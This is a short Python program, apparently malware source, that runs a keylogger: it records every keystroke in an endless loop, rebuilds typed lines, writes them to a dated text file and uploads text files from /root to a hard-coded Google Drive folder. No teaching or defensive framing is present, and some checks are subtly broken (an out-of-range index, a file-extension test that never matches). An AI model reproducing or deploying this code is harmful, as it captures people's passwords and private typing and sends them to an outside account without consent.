import keyboard

def gerar_nome():
    import datetime
    import random
    direita = ('breu','escuro','obscuro','trevas','sombra','caligem', 'neblina', 'blecaute', 'apagao', 'opaco', 'tenebroso')
    name = datetime.date
    name = str(name.today())

    return name + '-' + direita[random.randint(0,11)]

arquivo = gerar_nome() + '.txt'

def google_drive():
    from pydrive.auth import GoogleAuth
    from pydrive.drive import GoogleDrive
    import os

    gauth = GoogleAuth()
    drive = GoogleDrive(gauth)

    folder = '1OvHDaMSzesRWVOC8seuTu7qVLfkmBiu8'

    directory = '/root'

    for f in os.listdir(directory):
        filename = os.path.join(directory, f)
        if filename[-3] == 'txt':
            gfile = drive.CreateFile({'parents': [{'id': folder}], 'title': f})
            gfile.SetContentFile(filename)
            gfile.Upload()

while True:
    frase = ''
    teclas = [[],[]]
    t = keyboard.record(until= 'return')


    for tecla in t:
        convertido = str(tecla)
        filtro = convertido[14:len(convertido) - 1].split()
        if filtro[1] == 'down':
            teclas[0].append(filtro)
        else:
            teclas[1].append(filtro)


    for letra in teclas[0]:
        if letra[0] == 'space':
            frase += ' '
        elif letra[0] == 'backspace':
            frase = frase[0:len(frase) - 1]
        elif letra[0] == 'enter':
            frase += ''
        else:
            frase += letra[0]

    keylog = open(arquivo, "a")
    keylog.write(frase + '\n')
    keylog.close()

    google_drive()

